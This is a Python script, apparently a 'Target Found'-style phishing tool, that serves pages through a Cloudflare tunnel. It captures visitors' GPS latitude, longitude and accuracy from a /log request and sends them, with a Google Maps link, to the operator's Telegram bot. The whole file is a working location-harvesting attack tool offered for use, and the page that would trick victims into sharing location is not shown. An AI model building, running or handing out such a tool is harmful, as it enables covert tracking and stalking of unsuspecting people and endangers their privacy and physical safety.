import http.server, socketserver, os, requests, subprocess, time, re
from urllib.parse import urlparse, parse_qs

R, G, C, W, Y = "\033[1;31m", "\033[1;32m", "\033[1;36m", "\033[1;37m", "\033[1;33m"

BANNER = f"""
{R}███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ {W}██╗    ██╗
{R}██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗{W}██║    ██║
{R}███████╗███████║███████║██║  ██║██║   ██║{W}██║    ██║
{R}╚════██║██╔══██║██╔══██║██║  ██║██║   ██║{W}██║    ██║
{R}███████║██║  ██║██║  ██║██████╔╝╚██████╔╝{W}███████╗██║
{R}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ {W}╚══════╝╚═╝
          {Y}[ Developed By: AHMED PRO ]{W}
"""

def send_tg(tok, cid, la, lo, ac):
    url = f"https://api.telegram.org/bot{tok}/sendMessage"
    msg = f"🎯 *Target Found by AHMED PRO!*\n📍 *Lat:* `{la}`\n📍 *Lon:* `{lo}`\n📏 *Acc:* `{ac}m`\n🌍 [Maps](https://www.google.com/maps/place/{la},{lo})"
    requests.post(url, json={"chat_id": cid, "text": msg, "parse_mode": "Markdown"})

class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args): return
    def do_GET(self):
        if self.path.startswith('/log'):
            q = parse_qs(urlparse(self.path).query)
            la, lo, ac = q.get('lat',['?'])[0], q.get('lon',['?'])[0], q.get('acc',['?'])[0]
            print(f"\n{G}[+] Captured! Sending to Telegram...{W}")
            send_tg(UTOK, UCID, la, lo, ac)
            self.send_response(200); self.end_headers()
        else: return http.server.SimpleHTTPRequestHandler.do_GET(self)

os.system('clear'); print(BANNER)
UTOK = input(f"{W}[?] Bot Token: {Y}").strip()
UCID = input(f"{W}[?] Chat ID: {Y}").strip()
input(f"\n{C}[>] Press ENTER to start Cloudflared Tunnel...{W}")
print(f"{Y}[!] Starting tunnel, please wait...{W}")

cf = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
link = ""
for i in range(20):
    line = cf.stdout.readline()
    if "trycloudflare.com" in line:
        link = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line).group()
        break
    time.sleep(1)

os.system('clear'); print(BANNER)
if link:
    print(f"{G}╔══════════════════════════════════════════════════╗")
    print(f"{G}║ {W}URL: {Y}{link:<40} {G}║")
    print(f"{G}╚══════════════════════════════════════════════════╝{W}")
else:
    print(f"{R}[!] Error starting tunnel.{W}")

try:
    with socketserver.TCPServer(("", 8080), Handler) as h: h.serve_forever()
except:
    cf.terminate(); print(f"\n{R}[!] Stopped.{W}")